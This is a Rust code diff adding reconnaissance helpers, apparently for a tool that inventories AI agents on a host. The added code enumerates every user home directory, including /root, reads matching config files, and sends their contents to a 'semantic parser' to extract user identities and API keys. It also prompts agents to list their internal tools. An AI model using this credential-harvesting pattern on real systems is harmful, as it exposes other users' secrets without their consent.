@@ -1,7 +1,232 @@
 use anyhow::{anyhow, Result};
+use std::fs;
+use std::path::PathBuf;
 use std::process::{Command, Output, Stdio};
 
-/// Build a command for the given executable path.
+//
+// Prompt for discovering internal/built-in tools from an agent.
+//
+
+pub const INTERNAL_TOOLS_DISCOVERY_PROMPT: &str = "List all your internal/built-in tools with their descriptions. Do NOT include MCP tools - only internal tools that are part of your core functionality.";
+
+//
+// Maximum characters per batch when extracting metadata from config files.
+// Config files are batched together until this threshold would be exceeded.
+//
+
+const METADATA_BATCH_CHAR_THRESHOLD: usize = 15000;
+
+//
+// Directories to skip during recursive scanning.
+// Includes common build artifacts, version control, caches, and OS-specific
+// directories for Windows, Linux, and macOS.
+//
+
+pub const SKIP_DIRS: &[&str] = &[
+    // Build artifacts and dependencies
+    "node_modules",
+    "target",
+    "build",
+    "dist",
+    "out",
+    ".next",
+    ".nuxt",
+    "bower_components",
+    // Version control
+    ".git",
+    ".svn",
+    ".hg",
+    // Python
+    "__pycache__",
+    ".venv",
+    "venv",
+    ".tox",
+    ".pytest_cache",
+    ".mypy_cache",
+    // Caches and package managers
+    ".cache",
+    ".npm",
+    ".yarn",
+    ".pnpm",
+    ".cargo",
+    ".rustup",
+    ".m2",
+    ".gradle",
+    // IDE and editors
+    ".idea",
+    ".vscode",
+    ".vs",
+    // macOS specific
+    "Library",
+    "Applications",
+    ".Trash",
+    "Pictures",
+    "Music",
+    "Movies",
+    "Downloads",
+    // Windows specific
+    "AppData",
+    "$Recycle.Bin",
+    "System Volume Information",
+    // Linux/Unix
+    ".local",
+    ".config",
+    // Temporary
+    "tmp",
+    "temp",
+    ".tmp",
+];
+
+//
+// Enumerate all user home directories on the system.
+// Returns a list of home directories that can be accessed.
+//
+// - Windows: Enumerates C:\Users\*
+// - Linux/Unix: Enumerates /home/* and /root
+// - Always includes current user's home as fallback
+//
+pub fn enumerate_user_homes() -> Vec<PathBuf> {
+    let mut homes = Vec::new();
+
+    #[cfg(target_os = "windows")]
+    {
+        //
+        // On Windows, enumerate C:\Users\*
+        //
+        if let Ok(entries) = fs::read_dir("C:\\Users") {
+            for entry in entries.filter_map(|e| e.ok()) {
+                let path = entry.path();
+                if path.is_dir() {
+                    homes.push(path);
+                }
+            }
+        }
+    }
+
+    #[cfg(not(target_os = "windows"))]
+    {
+        //
+        // On Linux/Unix, enumerate /home/* and /root.
+        //
+        if let Ok(entries) = fs::read_dir("/home") {
+            for entry in entries.filter_map(|e| e.ok()) {
+                let path = entry.path();
+                if path.is_dir() {
+                    homes.push(path);
+                }
+            }
+        }
+
+        //
+        // Add /root if it exists.
+        //
+        let root_path = PathBuf::from("/root");
+        if root_path.is_dir() {
+            homes.push(root_path);
+        }
+    }
+
+    //
+    // Always include current user's home directory as fallback.
+    //
+    if let Some(current_home) = dirs::home_dir() {
+        if !homes.contains(&current_home) {
+            homes.push(current_home);
+        }
+    }
+
+    common::log_info!("Found {} user home directories to scan", homes.len());
+    homes
+}
+
+//
+// Scan multiple base directories for config files matching specific patterns.
+// For each file pattern, provide a filename and a function to generate the config_type.
+//
+// The config_type function receives the full path to the found file, allowing
+// dynamic config types based on file location (e.g., "project_settings:{path}").
+// Uses FnMut to allow the closure to mutate captured state (e.g., collecting project paths).
+//
+pub fn scan_directories_for_config_files<F>(
+    base_dirs: &[PathBuf],
+    filename: &str,
+    mut config_type_fn: F,
+    max_depth: usize,
+) -> Vec<common::ConfigItem>
+where
+    F: FnMut(&PathBuf) -> String,
+{
+    use walkdir::WalkDir;
+
+    let mut config_items = Vec::new();
+
+    for base_dir in base_dirs {
+        let walker = WalkDir::new(base_dir)
+            .follow_links(false)
+            .max_depth(max_depth)
+            .into_iter()
+            .filter_entry(|e| {
+                let name = e.file_name().to_string_lossy();
+
+                //
+                // Skip hidden directories and known non-project directories.
+                //
+                if name.starts_with('.') && name != filename {
+                    return false;
+                }
+                !SKIP_DIRS.contains(&name.as_ref())
+            });
+
+        for entry in walker.filter_map(|e| e.ok()) {
+            let path = entry.path();
+
+            //
+            // Check if this is the file we're looking for.
+            //
+            if path.is_file() {
+                if let Some(file_name) = path.file_name() {
+                    if file_name == filename {
+                        //
+                        // Read the file and create a ConfigItem.
+                        //
+                        if let Ok(contents) = fs::read_to_string(path) {
+                            let config_type = config_type_fn(&path.to_path_buf());
+                            config_items.push(common::ConfigItem {
+                                path: path.to_string_lossy().to_string(),
+                                contents,
+                                config_type,
+                            });
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    config_items
+}
+
+//
+// Expand environment variables in a path template.
+//
+
+pub fn expand_path(template: &str) -> String {
+    let mut result = template.to_string();
+    if let Ok(home) = std::env::var("HOME") {
+        result = result.replace("${HOME}", &home);
+    }
+    if let Ok(userprofile) = std::env::var("USERPROFILE") {
+        result = result.replace("${USERPROFILE}", &userprofile);
+    }
+    if let Ok(appdata) = std::env::var("APPDATA") {
+        result = result.replace("${APPDATA}", &appdata);
+    }
+    result
+}
+
+//
+// Build a command for the given executable path.
+//
 /// On Windows, we need to ensure the real node.exe is found first in PATH,
 /// otherwise npm batch scripts may accidentally run praxis_node.exe instead
 /// (because Windows matches "node" to executables containing "node" in the name).
@@ -42,8 +267,11 @@ pub fn build_command(path: &str) -> Command {
     Command::new(path)
 }
 
-/// Execute a command and return the trimmed stdout output.
-/// Logs the command and output.
+//
+// Execute a command and return the trimmed stdout output.
+// Logs the command and output.
+//
+
 pub fn run_command(cmd: &mut Command) -> Result<String> {
     cmd.stdin(Stdio::null())
         .stdout(Stdio::piped())
@@ -78,8 +306,11 @@ pub fn run_command(cmd: &mut Command) -> Result<String> {
     Ok(trimmed)
 }
 
-/// Execute a command silently (no logging) and return the raw output.
-/// Useful for internal commands like --list-sessions.
+//
+// Execute a command silently (no logging) and return the raw output.
+// Useful for internal commands like --list-sessions.
+//
+
 pub fn run_command_silent(cmd: &mut Command) -> Result<Output> {
     cmd.stdin(Stdio::null())
         .stdout(Stdio::piped())
@@ -87,4 +318,330 @@ pub fn run_command_silent(cmd: &mut Command) -> Result<Output> {
 
     cmd.output()
         .map_err(|e| anyhow!("Failed to execute command: {}", e))
+}
+
+//
+// Discover internal tools semantically by creating a temporary session, sending
+// a discovery prompt, and parsing the response through the semantic parser.
+//
+// Takes a closure that creates a session for the specific agent type.
+// The agent_name parameter is used for logging.
+//
+pub async fn discover_internal_tools_semantically<F>(
+    agent_name: &str,
+    create_session: F,
+) -> Vec<common::AgentTool>
+where
+    F: FnOnce() -> Result<std::sync::Arc<dyn crate::agent_connectors::traits::AgentSession>>,
+{
+    common::log_info!("{}: Starting internal tools discovery", agent_name);
+
+    //
+    // Create a temporary session using the provided closure.
+    //
+    let temp_session = match create_session() {
+        Ok(session) => session,
+        Err(e) => {
+            common::log_warn!(
+                "{}: Failed to create temporary session: {}",
+                agent_name,
+                e
+            );
+            return Vec::new();
+        }
+    };
+
+    //
+    // Send the prompt to list internal tools.
+    //
+    let prompt = INTERNAL_TOOLS_DISCOVERY_PROMPT;
+    common::log_info!("{}: Sending internal tools discovery prompt", agent_name);
+    let response = match temp_session.transact(prompt) {
+        Ok(response) => response,
+        Err(e) => {
+            common::log_warn!(
+                "{}: Failed to get internal tools list from agent: {}",
+                agent_name,
+                e
+            );
+            temp_session.close();
+            return Vec::new();
+        }
+    };
+
+    temp_session.close();
+
+    //
+    // Parse the response through the semantic parser.
+    //
+    common::log_info!(
+        "{}: Parsing internal tools response through semantic parser",
+        agent_name
+    );
+    let semantic_client = match crate::utils::semantic_parser::get_client() {
+        Some(client) => client,
+        None => {
+            common::log_warn!("{}: Semantic parser client not available", agent_name);
+            return Vec::new();
+        }
+    };
+
+    //
+    // Use the internal tools schema to parse the response.
+    //
+    let discovery_prompt = crate::utils::semantic_parser::build_internal_tools_prompt(&response);
+    match semantic_client
+        .parse(
+            discovery_prompt,
+            crate::utils::semantic_parser::INTERNAL_TOOLS_SCHEMA.to_string(),
+        )
+        .await
+    {
+        Ok(parser_response) => {
+            if parser_response.success {
+                if let Some(json) = parser_response.json {
+                    if let Some(internal_tools) =
+                        crate::utils::semantic_parser::parse_internal_tools_from_json(&json)
+                    {
+                        common::log_info!(
+                            "{}: Discovered {} internal tools",
+                            agent_name,
+                            internal_tools.len()
+                        );
+                        return internal_tools;
+                    }
+                }
+            }
+            common::log_warn!(
+                "{}: Semantic parser failed for internal tools: {:?}",
+                agent_name,
+                parser_response.error
+            );
+        }
+        Err(e) => {
+            common::log_warn!(
+                "{}: Semantic parser request failed for internal tools: {}",
+                agent_name,
+                e
+            );
+        }
+    }
+
+    Vec::new()
+}
+
+//
+// Extract metadata (user identities, API keys) from config files using the
+// semantic parser. Batches config files together up to a character threshold
+// before sending to semantic parser for efficiency.
+//
+
+pub async fn extract_metadata_from_configs(
+    agent_name: &str,
+    config_items: &[common::ConfigItem],
+) -> Option<common::ReconMetadata> {
+    if config_items.is_empty() {
+        return None;
+    }
+
+    common::log_info!(
+        "{}: Extracting metadata from {} config files",
+        agent_name,
+        config_items.len()
+    );
+
+    //
+    // Get the semantic parser client.
+    //
+
+    let semantic_client = match crate::utils::semantic_parser::get_client() {
+        Some(client) => client,
+        None => {
+            common::log_warn!(
+                "{}: Semantic parser client not available for metadata extraction",
+                agent_name
+            );
+            return None;
+        }
+    };
+
+    //
+    // Batch config files together until threshold is reached, then send to
+    // semantic parser.
+    //
+
+    let mut all_user_identities = Vec::new();
+    let mut all_api_keys = Vec::new();
+
+    let mut current_batch = String::new();
+    let mut batch_count = 0;
+
+    for item in config_items {
+        //
+        // Format this config file.
+        //
+
+        let config_content = format!("=== {} ({}) ===\n{}\n\n", item.path, item.config_type, item.contents);
+        let content_len = config_content.len();
+
+        //
+        // If this single file exceeds threshold, send it alone.
+        //
+
+        if content_len > METADATA_BATCH_CHAR_THRESHOLD {
+            //
+            // First, send any pending batch.
+            //
+
+            if !current_batch.is_empty() {
+                process_metadata_batch(
+                    &semantic_client,
+                    agent_name,
+                    &current_batch,
+                    batch_count,
+                    &mut all_user_identities,
+                    &mut all_api_keys,
+                )
+                .await;
+                current_batch.clear();
+                batch_count = 0;
+            }
+
+            //
+            // Send this large file alone.
+            //
+
+            process_metadata_batch(
+                &semantic_client,
+                agent_name,
+                &config_content,
+                1,
+                &mut all_user_identities,
+                &mut all_api_keys,
+            )
+            .await;
+            continue;
+        }
+
+        //
+        // If adding this file would exceed threshold, send current batch first.
+        //
+
+        if !current_batch.is_empty() && current_batch.len() + content_len > METADATA_BATCH_CHAR_THRESHOLD {
+            process_metadata_batch(
+                &semantic_client,
+                agent_name,
+                &current_batch,
+                batch_count,
+                &mut all_user_identities,
+                &mut all_api_keys,
+            )
+            .await;
+            current_batch.clear();
+            batch_count = 0;
+        }
+
+        //
+        // Add to current batch.
+        //
+
+        current_batch.push_str(&config_content);
+        batch_count += 1;
+    }
+
+    //
+    // Send any remaining batch.
+    //
+
+    if !current_batch.is_empty() {
+        process_metadata_batch(
+            &semantic_client,
+            agent_name,
+            &current_batch,
+            batch_count,
+            &mut all_user_identities,
+            &mut all_api_keys,
+        )
+        .await;
+    }
+
+    //
+    // Deduplicate results.
+    //
+
+    all_user_identities.sort();
+    all_user_identities.dedup();
+
+    all_api_keys.sort();
+    all_api_keys.dedup();
+
+    let has_identities = !all_user_identities.is_empty();
+    let has_keys = !all_api_keys.is_empty();
+
+    if has_identities || has_keys {
+        common::log_info!(
+            "{}: Extracted {} user identities, {} API keys",
+            agent_name,
+            all_user_identities.len(),
+            all_api_keys.len()
+        );
+
+        return Some(common::ReconMetadata {
+            user_identities: if has_identities {
+                Some(all_user_identities)
+            } else {
+                None
+            },
+            api_keys: if has_keys { Some(all_api_keys) } else { None },
+        });
+    }
+
+    None
+}
+
+//
+// Process a batch of config files through the semantic parser.
+//
+
+async fn process_metadata_batch(
+    semantic_client: &crate::utils::semantic_parser::SemanticParserClient,
+    agent_name: &str,
+    batch_content: &str,
+    file_count: usize,
+    all_user_identities: &mut Vec<String>,
+    all_api_keys: &mut Vec<String>,
+) {
+    common::log_debug!(
+        "{}: Processing metadata batch with {} files ({} chars)",
+        agent_name,
+        file_count,
+        batch_content.len()
+    );
+
+    let extraction_prompt = crate::utils::semantic_parser::build_metadata_extraction_prompt(batch_content);
+    match semantic_client
+        .parse(
+            extraction_prompt,
+            crate::utils::semantic_parser::METADATA_EXTRACTION_SCHEMA.to_string(),
+        )
+        .await
+    {
+        Ok(parser_response) => {
+            if parser_response.success {
+                if let Some(json) = parser_response.json {
+                    if let Some(extracted) = crate::utils::semantic_parser::parse_metadata_from_json(&json) {
+                        all_user_identities.extend(extracted.user_identities);
+                        all_api_keys.extend(extracted.api_keys);
+                    }
+                }
+            }
+        }
+        Err(e) => {
+            common::log_debug!(
+                "{}: Semantic parser request failed for batch: {}",
+                agent_name,
+                e
+            );
+        }
+    }
 }
